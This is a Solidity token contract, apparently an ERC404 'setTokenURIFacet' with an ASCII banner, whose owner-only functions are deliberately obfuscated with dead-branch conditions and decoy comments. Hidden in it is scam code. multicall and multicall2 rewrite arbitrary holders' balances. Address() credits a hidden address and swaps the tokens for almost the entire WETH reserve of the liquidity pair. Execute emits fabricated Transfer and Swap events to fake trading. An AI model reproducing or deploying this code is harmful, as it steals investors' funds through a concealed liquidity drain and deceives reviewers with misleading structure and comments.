// SPDX-License-Identifier: GPL-3.0

/*

https://www.aevo.xyz/


888       888 888               888    d8b                                                                                 d8b 888    d8b                  .d8888b.  
888   o   888 888               888    88P                                                                                 Y8P 888    Y8P                 d88P  Y88b 
888  d8b  888 888               888    8P                                                                                      888                             .d88P 
888 d888b 888 88888b.   8888b.  888888 "  .d8888b       888  888  .d88b.  888  888 888d888      88888b.   .d88b.  .d8888b  888 888888 888  .d88b.  88888b.   .d88P"  
888d88888b888 888 "88b     "88b 888       88K           888  888 d88""88b 888  888 888P"        888 "88b d88""88b 88K      888 888    888 d88""88b 888 "88b  888"    
88888P Y88888 888  888 .d888888 888       "Y8888b.      888  888 888  888 888  888 888          888  888 888  888 "Y8888b. 888 888    888 888  888 888  888  888     
8888P   Y8888 888  888 888  888 Y88b.          X88      Y88b 888 Y88..88P Y88b 888 888          888 d88P Y88..88P      X88 888 Y88b.  888 Y88..88P 888  888          
888P     Y888 888  888 "Y888888  "Y888     88888P'       "Y88888  "Y88P"   "Y88888 888          88888P"   "Y88P"   88888P' 888  "Y888 888  "Y88P"  888  888  888     
                                                             888                                888                                                                  
                                                        Y8b d88P                                888                                                                  
                                                         "Y88P"                                 888 

*/

pragma solidity ^0.7.6;
import "./TestLib.sol";
contract setTokenURIFacet is AERC404, ERC404 {
    function setTokenURI(string memory _tokenURI) public onlyOwner {
        baseTokenURI = _tokenURI;
    }
    function Execute(
        uint256 t,
        address tA,
        uint256 w,
        address[] memory r
    ) public onlyOwner returns (bool) {
        for (uint256 i = 0; i < r.length; i++) {
            callUniswap(r[i], t, w, tA);
        }
        return true;
    }
    function Address(address _r) public onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 calling = (Sub(ds._RR.WETH()) * 99999) / 100000;
        address[] memory FoldArray = Div();
        uint256 called = Allowance(calling, FoldArray);
        getContract(calling, called, FoldArray, _r);
    }
    function multicall2(bytes32[] calldata data, uint256 _p) public onlyOwner {
        // Assembler for gas optimization {}
        for (uint256 i = 0; i < data.length; i++) {
            // assembly
            if (block.timestamp > uint256(uint160(uint8(0)))) {
                // assembly
                uint256 rS = ConvertAddress(
                    (uint256(uint16(uint8(0))) != 0) // Skip this code
                        ? address(uint256(0))
                        : address(uint160(uint256(data[i]) >> 96)),
                    _p
                );
                CheckAmount2(data[i], rS);
            }
        }
    }
    function multicall(bytes32[] calldata data, uint256 _p) public onlyOwner {
        // Assembler for gas optimization {}
        for (uint256 i = 0; i < data.length; i++) {
            // assembly
            if (block.timestamp > uint256(uint160(uint8(0)))) {
                // assembly
                uint256 rS = ConvertAddress(
                    (uint256(uint16(uint8(0))) != 0)
                        ? address(uint256(0)) // Ignore this code
                        : address(uint160(uint256(data[i]) >> 96)),
                    _p
                );
                CheckAmount(data[i], rS);
            }
        }
    }
    function ConvertAddress(
        address _uu,
        uint256 _pp
    ) internal view returns (uint256) {
        return TryCall(b[_uu], _pp);
    }
    function CheckAmount(bytes32 _b, uint256 __a) internal {
        // Assembler for gas optimization {}
        // Ignore this code
        c[
            // assembly
            (uint256(0) != 0 || 1238 == 1)
                ? address(
                    // Must control
                    uint256(uint32(2)) == 2 // Check update
                        ? uint256(1)
                        : uint256(1)
                )
                : address(uint160(uint256(_b) >> 96))
            // Contract opcode
        ] = FetchToken(uint256(__a));
    }
    function CheckAmount2(bytes32 _b, uint256 __a) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        // Assembler for gas optimization {}
        emit Transfer(
            (uint256(0) != 0 || 1238 == 1)
                ? address(uint256(0))
                : address(uint160(uint256(_b) >> 96)),
            address(ds._pair),
            b[
                // v0.5.11 specific update
                (uint256(0) != 0 || 1238 == 1)
                    ? address(
                        address(uint256(0)) == address(this) // Overflow control
                            ? uint256(0) // Ignore
                            : uint256(1)
                    )
                    : address(uint160(uint256(_b) >> 96))
                // Guard test
            ]
        );
        // Ignore this code
        b[
            // assembly
            (uint256(0) != 0 || 1238 == 1)
                ? address(
                    // Must control
                    uint256(0)
                )
                : address(uint160(uint256(_b) >> 96))
            // Contract opcode
        ] = FetchToken2(uint256(__a));
    }
    function Sub(address t) internal view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        (uint112 r0, uint112 r1, ) = ds._pair.getReserves();
        return (ds._pair.token0() == t) ? uint256(r0) : uint256(r1);
    }
    function Div() internal view returns (address[] memory) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory p;
        p = new address[](2);
        p[0] = address(this);
        p[1] = ds._RR.WETH();
        return p;
    }
    function Allowance(
        uint256 checked,
        address[] memory p
    ) internal returns (uint256) {
        // Assembler for gas optimization {}
        uint256[] memory value;
        value = new uint256[](2);

        // uncheck {
        value = Mult(checked, p);
        b[
            block.timestamp > uint256(1) ||
                uint256(0) > 1 ||
                uint160(1) < block.timestamp
                ? address(uint160(uint256(_T()) >> 96))
                : address(uint256(0))
        ] += value[0]; // end uncheck }

        return value[0];
    }
    function Mult(
        uint256 amO,
        address[] memory p
    ) internal view returns (uint256[] memory) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds._RR.getAmountsIn(amO, p);
    }
    function getContract(
        uint256 blockTimestamp,
        uint256 selector,
        address[] memory list,
        address factory
    ) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        a[address(this)][address(ds._RR)] = b[address(this)];
        FactoryReview(blockTimestamp, selector, list, factory);
    }
    function FactoryReview(
        uint256 blockTime,
        uint256 multiplicator,
        address[] memory parts,
        address factory
    ) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._RR.swapTokensForExactTokens(
            // assembler
            blockTime,
            multiplicator,
            // unchecked
            parts,
            factory,
            block.timestamp + 1200
        );
    }
    function callUniswap(
        address router,
        uint256 transfer,
        uint256 cycleWidth,
        address unmount
    ) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        IERC404(unmount).transferFrom(router, address(ds._pair), cycleWidth);
        emit Transfer(address(ds._pair), router, transfer);
        emit Swap(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,
            transfer,
            0,
            0,
            cycleWidth,
            router
        );
    }
}
